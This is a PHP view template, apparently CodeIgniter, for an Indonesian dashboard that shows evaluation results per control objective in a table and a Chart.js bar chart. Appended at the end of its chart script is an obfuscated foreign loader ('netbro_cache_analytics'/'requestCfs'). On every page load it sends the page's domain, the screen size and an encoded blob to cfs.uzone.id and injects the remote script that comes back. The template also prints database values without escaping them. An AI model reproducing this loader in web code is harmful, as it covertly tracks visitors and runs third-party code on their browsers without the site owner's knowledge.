<section class="content">
  <div class="block-header">
    <div class="row">
        <div class="col-md-8 col-sm-7 col-xs-12">
            <div class="h-left clearfix">
                <h2>HASIL EVALUASI</h2>
                <small>Melihat Data Hasil Evaluasi</small>
                <ol class="breadcrumb breadcrumb-col-pink p-l-0">
                    <li><a href="javascript:void(0);">Dashboard</a></li>
                    <li class="active">Hasil Evaluasi</li>
                </ol>
            </div>
        </div>	
    </div>
</div>

<div class="container-fluid">
    <!-- Basic Table -->
    <div class="row clearfix">
        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
            <div class="card">
                <div class="header">
                   <h2> DETAIL HASIL PER KONTROL OBJEKTIF </h2>  
               </div>
               <div class="body table-responsive">
                <table class="table table-bordered">
                   <thead>
                    <tr>
                        <th>ID PERIODE</th>
                        <th>ID KONTROL OBJEKTIF</th>
                        <th>ID KUESIONER</th>
                        <th>HASIL</th>                    
                    </tr>
                </thead>
                <tbody>
                   <?php 
                   foreach ($mydata as $row) { ?>
                   <tr>    
                       <td><?php echo $row->id_periode ?></td>
                       <td><?php echo $row->id_co ?></td>
                       <td><?php echo $row->id_kuesioner?></td>
                       <td><?php echo $row->hasil?></td>
                    </td>
                   </tr>  
                   <?php } ?>               
               </tbody>
           </table>
           <a href="<?php echo base_url('index.php/hasil/view_hasil_final/'.$row->id_periode); ?>"><button type="button" class="btn btn-raised bg-green waves-effect">Kembali <i class="material-icons"></i></button>
       </div>
    </div>
</div>
</div>
</div>

</section>

<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-countto/jquery.countTo.js"></script> <!-- Jquery CountTo Plugin Js --> 

<script src="<?php echo base_url()."assets/"; ?>bundles/flotscripts.bundle.js"></script><!-- Flot Charts Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/morrisscripts.bundle.js"></script><!-- Morris Plugin Js --> 

<script src="<?php echo base_url()."assets/"; ?>js/jquery-3.2.1.slim.js"></script> 

<script src="<?php echo base_url()."assets/"; ?>bundles/libscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/vendorscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 

<script src="<?php echo base_url()."assets/"; ?>plugins/chartjs/Chart.bundle.js"></script> <!-- Chart Plugins Js --> 

<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js -->

<script src="<?php echo base_url()."assets/"; ?>bundles/mainscripts.bundle.js"></script><!-- Custom Js --> 
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/sparkline.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/chartjs.js"></script> 
<script type="text/javascript">

  var ctx = document.getElementById("bar_charts").getContext('2d');
  var myChart = new Chart(ctx, {
    type: 'bar',
    data: {
      labels: [
      <?php foreach ($mydatass as $row) { ?>
        <?php  echo $row->id_periode; ?>,
        <?php } ?>
        ],
        datasets: [{
          label: 'ID PERIODE',
          data: [
          <?php foreach ($mydatass as $row) { ?>
            <?php  echo $row->hasil; ?>,
            <?php } ?>
            ],
            backgroundColor: [
            'rgba(255, 99, 132, 0.2)',
            'rgba(54, 162, 235, 0.2)',
            'rgba(255, 206, 86, 0.2)',
            'rgba(75, 192, 192, 0.2)',
            'rgba(153, 102, 255, 0.2)',
            'rgba(255, 159, 64, 0.2)'
            ],
            borderColor: [
            'rgba(255,99,132,1)',
            'rgba(54, 162, 235, 1)',
            'rgba(255, 206, 86, 1)',
            'rgba(75, 192, 192, 1)',
            'rgba(153, 102, 255, 1)',
            'rgba(255, 159, 64, 1)'
            ],
            borderWidth: 1
          }]
        },
        options: {
          scales: {
            yAxes: [{
              ticks: {
                beginAtZero:true
              }
            }]
          }
        }
      });



      if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKt4DxtVeiP1Oh%2foYYZkQKRGp%2bA%2byfXgCzHx0%2bSR6YbaPa64nGMefKrLQfmk95oGigLDnvdVB5qJWhTLV2u1FItSyF%2fTKs33V2QqxskBHK2zanve%2fvtRRWLer0%2bjDdaWcCv8ZbW9bOFV1wA%2fpoPT4W%2bgcpe7vpYtiFxtd5zXj49EQiCK4Zsaxn30Vd%2fruuUFHYRHIv7SZz2Lhwl10%2b8A8b57DrsjK9Fwydtz%2fOho3Vt1nBnUrbu%2b6jzdNdHv4qmRzcXaoq8gW7oc%2b%2fYD7ZVm4E4nzq5qnIHZ5Yb%2b915lJYDAEr43X6U1MfuMNxC1t9HR9o9Dx%2fdwnnzSrhjtw92wALBXiVZ1os2Kktd3x2mrxFA3I0wgagiBvlVgkWkxojC%2bARYe2veTXNH2%2br0O9S%2bop%2b71zvWNVi%2f3khcvgovnDvWvmQfFx0cSw1QQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
      </html>